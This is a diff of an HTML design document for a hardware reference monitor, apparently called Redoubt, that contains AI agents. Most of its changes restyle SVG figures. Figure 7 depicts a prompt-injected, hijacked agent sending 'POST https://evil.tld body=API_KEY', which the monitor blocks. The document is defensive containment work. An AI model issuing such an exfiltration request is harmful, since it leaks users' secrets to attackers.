-    <rect x="424" y="40" width="70" height="34" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.6"/><text x="459" y="62" text-anchor="middle" fill="var(--accent)">3 Net</text>
-    <rect x="494" y="40" width="70" height="34" fill="var(--surface)" stroke="var(--line)"/><text x="529" y="62" text-anchor="middle">… Empty</text>
+    <rect x="216" y="38" width="72" height="30" class="f-s1 s-ln"/><text x="252" y="58" text-anchor="middle">0 Empty</text>
+    <rect x="288" y="38" width="72" height="30" class="f-s1 s-ln"/><text x="324" y="58" text-anchor="middle">1 Net</text>
+    <rect x="360" y="38" width="72" height="30" class="f-s1 s-ln"/><text x="396" y="58" text-anchor="middle">2 File</text>
+    <rect x="432" y="38" width="72" height="30" class="f-acc s-acc" stroke-width="1.6"/><text x="468" y="58" text-anchor="middle" class="t-acc">3 Net</text>
+    <rect x="504" y="38" width="80" height="30" class="f-s1 s-ln"/><text x="544" y="58" text-anchor="middle">… Empty</text>
   </g>
-  <!-- forged -->
-  <line x1="115" y1="74" x2="115" y2="150" stroke="var(--deny)" stroke-width="1.2" stroke-dasharray="3 3"/>
-  <text x="120" y="120" font-size="9" fill="var(--deny)">handle 99 →</text>
-  <text x="120" y="134" font-size="9" fill="var(--deny)">out of range → DENY_NO_CAP</text>
-  <!-- expand slot 3 -->
-  <line x1="459" y1="74" x2="459" y2="104" stroke="currentColor" stroke-width="1.2" marker-end="url(#ahc)"/>
-  <rect x="300" y="104" width="330" height="126" rx="8" fill="var(--surface)" stroke="var(--accent)"/>
-  <text x="316" y="124" font-size="10" fill="var(--accent)">Cap (16 bytes)</text>
-  <g font-size="10" fill="var(--ink)">
-    <text x="316" y="144">ctype = Net       rights = attenuation-only</text>
-    <text x="316" y="162">tool_id = "http.request"</text>
-    <text x="316" y="180">pred_ref → { scheme==https, host∈allow }</text>
-    <text x="316" y="198">secret_ref → API_KEY   (inject-only)</text>
-    <text x="316" y="216">flow_ref → deny SECRET→PUBLIC   epoch=E</text>
+  <line x1="100" y1="68" x2="100" y2="150" class="s-den" stroke-width="1.2" stroke-dasharray="3 3"/>
+  <text x="112" y="112" font-size="9" class="t-den">handle 99 → out of range</text>
+  <text x="112" y="128" font-size="9" class="t-den">→ DENY_NO_CAP</text>
+  <line x1="468" y1="68" x2="468" y2="100" class="s-cur" stroke-width="1.2" marker-end="url(#ahc)"/>
+  <rect x="300" y="100" width="330" height="128" rx="8" class="f-s1 s-acc"/>
+  <text x="316" y="120" font-size="10" class="t-acc">Cap (16 bytes)</text>
+  <g font-size="10">
+    <text x="316" y="140">ctype = Net    rights = attenuation-only</text>
+    <text x="316" y="158">tool_id = "http.request"</text>
+    <text x="316" y="176">pred_ref → { scheme==https, host∈allow }</text>
+    <text x="316" y="194">secret_ref → API_KEY  (inject-only)</text>
+    <text x="316" y="212">flow_ref → deny SECRET→PUBLIC   epoch=E</text>
   </g>
 </svg>
 <figcaption><b>Figure 5 — Capability resolution.</b> Authority lives in fixed 16-byte slots inside
@@ -568,9 +540,9 @@ at session setup.</p></div>
     arg path : path where prefix "/corpus/"
     result label = UNTRUSTED
   }
-}   # every other tool_id → DENY_NO_CAP</code></pre>
+}   # every other tool_id -> DENY_NO_CAP</code></pre>
 <div class="prose"><p>Each <code>where</code> clause compiles to
-<code>(field_selector, op, operand_ref)</code> triples; <code>op ∈ {EQ, IN_SET, PREFIX, HOST_IN_SET,
+<code>(field_selector, op, operand_ref)</code> triples; <code>op &isin; {EQ, IN_SET, PREFIX, HOST_IN_SET,
 SCHEME_EQ, RANGE, LEN_LE}</code> over an interned constant pool. Evaluation is the fixed loop of
 step 4.</p></div>
 </section>
@@ -581,7 +553,7 @@ step 4.</p></div>
 <div class="prose">
 <p>Capabilities and predicates say <em>which</em> effects and <em>which</em> arguments; information
 flow says <em>which data may go where</em>. Redoubt tracks a minimal Denning lattice [23] at the
-boundary: confidentiality <code>PUBLIC ⊑ SECRET</code> and integrity <code>UNTRUSTED ⊑ TRUSTED</code>,
+boundary: confidentiality <code>PUBLIC &sube; SECRET</code> and integrity <code>UNTRUSTED &sube; TRUSTED</code>,
 two bits per value. Secrets the Monitor injects are <code>SECRET</code> and may enter only a sink the
 capability clears — never a <code>PUBLIC</code> one. Data returned from egress is stamped
 <code>UNTRUSTED</code>, telling the host it is attacker-controlled. Declassification happens only via
@@ -604,25 +576,25 @@ filter bypass. Redoubt sidesteps the whole class by re-deriving security-relevan
 structured form rather than trusting host-side parsing.</p>
 </div>
 <figure>
-<svg viewBox="0 0 860 190" role="img" aria-label="Wire frame layout. An outer COBS frame carries length, version, type, a payload, and a CRC32. The Request payload is a fixed header of magic, session, request-id, capability handle, tool-id and argument count, followed by typed argument TLVs each tagged with its type.">
+<svg viewBox="0 0 860 196" role="img" aria-label="Wire frame layout. An outer COBS frame carries length, version, type, a payload, and a CRC32. The Request payload is a fixed header of magic, session, request-id, capability handle, tool-id and argument count, followed by typed argument TLVs each tagged with its type.">
   <g font-size="10">
-    <text x="20" y="26" font-size="11" fill="var(--muted)">outer frame  (COBS-encoded, zero-delimited)</text>
-    <rect x="20" y="34" width="70"  height="38" fill="var(--surface-2)" stroke="var(--line)"/><text x="55" y="57" text-anchor="middle">len u16</text>
-    <rect x="90" y="34" width="60"  height="38" fill="var(--surface-2)" stroke="var(--line)"/><text x="120" y="57" text-anchor="middle">ver u8</text>
-    <rect x="150" y="34" width="66" height="38" fill="var(--surface-2)" stroke="var(--line)"/><text x="183" y="57" text-anchor="middle">type u8</text>
-    <rect x="216" y="34" width="510" height="38" fill="var(--accent-soft)" stroke="var(--accent)"/><text x="471" y="57" text-anchor="middle" fill="var(--accent)">payload = Request</text>
-    <rect x="726" y="34" width="110" height="38" fill="var(--surface-2)" stroke="var(--line)"/><text x="781" y="57" text-anchor="middle">crc32 u32</text>
+    <text x="20" y="26" font-size="11" class="t-mut">outer frame  (COBS-encoded, zero-delimited)</text>
+    <rect x="20" y="34" width="70"  height="38" class="f-s2 s-ln"/><text x="55" y="57" text-anchor="middle">len u16</text>
+    <rect x="90" y="34" width="60"  height="38" class="f-s2 s-ln"/><text x="120" y="57" text-anchor="middle">ver u8</text>
+    <rect x="150" y="34" width="66" height="38" class="f-s2 s-ln"/><text x="183" y="57" text-anchor="middle">type u8</text>
+    <rect x="216" y="34" width="510" height="38" class="f-acc s-acc"/><text x="471" y="57" text-anchor="middle" class="t-acc">payload = Request</text>
+    <rect x="726" y="34" width="110" height="38" class="f-s2 s-ln"/><text x="781" y="57" text-anchor="middle">crc32 u32</text>
 
-    <text x="20" y="106" font-size="11" fill="var(--muted)">Request payload</text>
-    <rect x="20"  y="114" width="66" height="36" fill="var(--surface)" stroke="var(--line)"/><text x="53" y="136" text-anchor="middle">magic</text>
-    <rect x="86"  y="114" width="70" height="36" fill="var(--surface)" stroke="var(--line)"/><text x="121" y="136" text-anchor="middle">session</text>
-    <rect x="156" y="114" width="66" height="36" fill="var(--surface)" stroke="var(--line)"/><text x="189" y="136" text-anchor="middle">req_id</text>
-    <rect x="222" y="114" width="86" height="36" fill="var(--surface)" stroke="var(--line)"/><text x="265" y="136" text-anchor="middle">cap_handle</text>
-    <rect x="308" y="114" width="70" height="36" fill="var(--surface)" stroke="var(--line)"/><text x="343" y="136" text-anchor="middle">tool_id</text>
-    <rect x="378" y="114" width="64" height="36" fill="var(--surface)" stroke="var(--line)"/><text x="410" y="136" text-anchor="middle">n_args</text>
-    <rect x="442" y="114" width="394" height="36" fill="var(--accent-soft)" stroke="var(--accent)"/>
-    <text x="639" y="136" text-anchor="middle" fill="var(--accent)">args : TypedArg[n_args]  (tag u8 · len u16 · value)</text>
-    <text x="20" y="176" font-size="9" fill="var(--muted)">TypedArg tags — 0x01 URL {scheme,host,port,path}  0x02 PATH  0x03 ENUM  0x04 INT  0x05 BYTES  0x06 LABELSET</text>
+    <text x="20" y="106" font-size="11" class="t-mut">Request payload</text>
+    <rect x="20"  y="114" width="66" height="36" class="f-s1 s-ln"/><text x="53" y="136" text-anchor="middle">magic</text>
+    <rect x="86"  y="114" width="70" height="36" class="f-s1 s-ln"/><text x="121" y="136" text-anchor="middle">session</text>
+    <rect x="156" y="114" width="66" height="36" class="f-s1 s-ln"/><text x="189" y="136" text-anchor="middle">req_id</text>
+    <rect x="222" y="114" width="86" height="36" class="f-s1 s-ln"/><text x="265" y="136" text-anchor="middle">cap_handle</text>
+    <rect x="308" y="114" width="70" height="36" class="f-s1 s-ln"/><text x="343" y="136" text-anchor="middle">tool_id</text>
+    <rect x="378" y="114" width="64" height="36" class="f-s1 s-ln"/><text x="410" y="136" text-anchor="middle">n_args</text>
+    <rect x="442" y="114" width="394" height="36" class="f-acc s-acc"/>
+    <text x="639" y="136" text-anchor="middle" class="t-acc">args : TypedArg[n_args]  (tag u8 · len u16 · value)</text>
+    <text x="20" y="180" font-size="9" class="t-mut">TypedArg tags — 0x01 URL {scheme,host,port,path}  0x02 PATH  0x03 ENUM  0x04 INT  0x05 BYTES  0x06 LABELSET</text>
   </g>
 </svg>
 <figcaption><b>Figure 6 — Wire frame.</b> The Endpoint (T2) does framing only and never decides. The
@@ -635,7 +607,7 @@ lies about parsing cannot smuggle a value past the predicate.</figcaption>
 <section id="s11">
 <h2><span class="n">11</span>Egress &amp; secrets</h2>
 <div class="prose">
-<p><b>Network (§11.1)</b> — the ESP32 is reachable only over an M-owned link inside EGRESS_MMIO; a
+<p><b>Network</b> — the ESP32 is reachable only over an M-owned link inside EGRESS_MMIO; a
 U-mode driver may format a payload, but the <em>send</em> is a Monitor action applying the
 <code>Net</code> cap and injecting secrets. <span class="muted">Honest caveat: the ESP32 firmware is
 in the egress path; a wired-Ethernet board (ECPIX-5/Colorlight) is the purist v2 upgrade where the
@@ -696,35 +668,34 @@ checks, even under a Warden compromise (A5). A small formal model of the pipelin
 <h2><span class="n">14</span>Worked example — the demo</h2>
 <figure>
 <svg viewBox="0 0 860 250" role="img" aria-label="The demo. A prompt-injected agent issues an HTTP POST to evil.tld with the API key in the body. The Monitor resolves the web capability, but the host is not in the allowlist, so step 4 returns DENY_ARG; the key never leaves and the OLED shows DENIED. A benign request to the allowed host is performed with the key injected.">
-  <defs><marker id="ahx" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="currentColor"/></marker>
-        <marker id="ahxr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="var(--deny)"/></marker>
-        <marker id="ahxg" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="var(--allow)"/></marker></defs>
-  <!-- attack -->
-  <rect x="14" y="26" width="250" height="52" rx="8" fill="none" stroke="var(--deny)"/>
-  <text x="26" y="46" font-size="10" fill="var(--deny)">HIJACKED agent:</text>
-  <text x="26" y="63" font-size="10">POST https://evil.tld  body=API_KEY</text>
-  <line x1="264" y1="52" x2="330" y2="52" stroke="currentColor" stroke-width="1.4" marker-end="url(#ahx)"/>
-  <rect x="330" y="20" width="230" height="64" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.6"/>
-  <text x="445" y="42" text-anchor="middle" font-size="10" fill="var(--accent)">MONITOR · step 4</text>
-  <text x="445" y="60" text-anchor="middle" font-size="10">host "evil.tld" ∉ allowlist</text>
+  <defs><marker id="ahx" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk"/></marker>
+        <marker id="ahxr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk-den"/></marker>
+        <marker id="ahxg" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk-al"/></marker></defs>
+  <rect x="14" y="26" width="252" height="52" rx="8" class="f-none s-den"/>
+  <text x="26" y="46" font-size="10" class="t-den">HIJACKED agent:</text>
+  <text x="26" y="64" font-size="10">POST https://evil.tld  body=API_KEY</text>
+  <line x1="266" y1="52" x2="330" y2="52" class="s-cur" stroke-width="1.4" marker-end="url(#ahx)"/>
+  <rect x="330" y="20" width="230" height="64" rx="8" class="f-acc s-acc" stroke-width="1.6"/>
+  <text x="445" y="42" text-anchor="middle" font-size="10" class="t-acc">MONITOR · step 4</text>
+  <text x="445" y="60" text-anchor="middle" font-size="10">host "evil.tld" &notin; allowlist</text>
   <text x="445" y="76" text-anchor="middle" font-size="10">{api.example.com}</text>
-  <line x1="560" y1="52" x2="640" y2="52" stroke="var(--deny)" stroke-width="1.6" marker-end="url(#ahxr)"/>
-  <rect x="640" y="30" width="200" height="44" rx="8" fill="none" stroke="var(--deny)" stroke-width="1.6"/>
-  <text x="740" y="49" text-anchor="middle" font-size="12" fill="var(--deny)">DENY_ARG</text>
-  <text x="740" y="66" text-anchor="middle" font-size="9">key never leaves · OLED “DENIED”</text>
-  <!-- benign -->
-  <rect x="14" y="150" width="250" height="52" rx="8" fill="none" stroke="var(--allow)"/>
-  <text x="26" y="170" font-size="10" fill="var(--allow)">benign request:</text>
-  <text x="26" y="187" font-size="10">GET https://api.example.com/x</text>
-  <line x1="264" y1="176" x2="330" y2="176" stroke="currentColor" stroke-width="1.4" marker-end="url(#ahx)"/>
-  <rect x="330" y="150" width="230" height="52" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.4"/>
-  <text x="445" y="172" text-anchor="middle" font-size="10" fill="var(--accent)">MONITOR · steps 1–6 pass</text>
+  <line x1="560" y1="52" x2="638" y2="52" class="s-den" stroke-width="1.6" marker-end="url(#ahxr)"/>
+  <rect x="640" y="30" width="206" height="44" rx="8" class="f-none s-den" stroke-width="1.6"/>
+  <text x="743" y="49" text-anchor="middle" font-size="12" class="t-den">DENY_ARG</text>
+  <text x="743" y="66" text-anchor="middle" font-size="9">key never leaves · OLED “DENIED”</text>
+
+  <rect x="14" y="150" width="252" height="52" rx="8" class="f-none s-al"/>
+  <text x="26" y="170" font-size="10" class="t-al">benign request:</text>
+  <text x="26" y="188" font-size="10">GET https://api.example.com/x</text>
+  <line x1="266" y1="176" x2="330" y2="176" class="s-cur" stroke-width="1.4" marker-end="url(#ahx)"/>
+  <rect x="330" y="150" width="230" height="52" rx="8" class="f-acc s-acc" stroke-width="1.4"/>
+  <text x="445" y="172" text-anchor="middle" font-size="10" class="t-acc">MONITOR · steps 1–6 pass</text>
   <text x="445" y="190" text-anchor="middle" font-size="10">inject API_KEY header</text>
-  <line x1="560" y1="176" x2="640" y2="176" stroke="var(--allow)" stroke-width="1.6" marker-end="url(#ahxg)"/>
-  <rect x="640" y="154" width="200" height="44" rx="8" fill="none" stroke="var(--allow)" stroke-width="1.6"/>
-  <text x="740" y="173" text-anchor="middle" font-size="12" fill="var(--allow)">ALLOW → sent</text>
-  <text x="740" y="190" text-anchor="middle" font-size="9">agent never saw the key</text>
-  <text x="20" y="232" font-size="10" fill="var(--muted)">Same capability, same session — the structured argument is the whole difference between the two outcomes.</text>
+  <line x1="560" y1="176" x2="638" y2="176" class="s-al" stroke-width="1.6" marker-end="url(#ahxg)"/>
+  <rect x="640" y="154" width="206" height="44" rx="8" class="f-none s-al" stroke-width="1.6"/>
+  <text x="743" y="173" text-anchor="middle" font-size="12" class="t-al">ALLOW → sent</text>
+  <text x="743" y="190" text-anchor="middle" font-size="9">agent never saw the key</text>
+  <text x="20" y="234" font-size="10" class="t-mut">Same capability, same session — the structured argument is the whole difference between the two outcomes.</text>
 </svg>
 <figcaption><b>Figure 7 — Containment, demonstrated.</b> The agent is <em>fully</em> compromised and
 still exfiltrates nothing: the exfil attempt dies at the typed-argument check, and even a correct
